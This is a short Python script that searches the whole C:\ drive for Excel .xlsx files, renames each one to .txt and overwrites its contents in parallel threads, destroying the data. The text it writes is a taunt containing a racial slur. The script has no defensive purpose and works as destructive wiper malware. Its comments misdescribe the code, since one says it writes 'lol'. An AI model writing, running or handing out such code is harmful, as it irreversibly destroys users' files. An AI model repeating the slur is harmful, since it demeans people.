import os
from concurrent.futures import ThreadPoolExecutor

# Directory to start search (root of the file system)
search_directory = 'C:\\'  # Use raw string to avoid escape sequences

def process_file(file_path):
    # New file path with .txt extension
    txt_file_path = file_path[:-5] + '.txt'
    
    # Rename the file to .txt
    os.rename(file_path, txt_file_path)
    
    # Write "lol" inside the renamed .txt file
    with open(txt_file_path, 'w') as txt_file:
        txt_file.write('RIP your data n1gga!')
    

# List to hold all found .xlsx files
xlsx_files = []

# Walk through the directory
for dirpath, dirnames, filenames in os.walk(search_directory):
    for file in filenames:
        if file.endswith('.xlsx'):
            # Append the full file path to the list
            xlsx_files.append(os.path.join(dirpath, file))

# Use ThreadPoolExecutor to process files in parallel
with ThreadPoolExecutor() as executor:
    executor.map(process_file, xlsx_files)
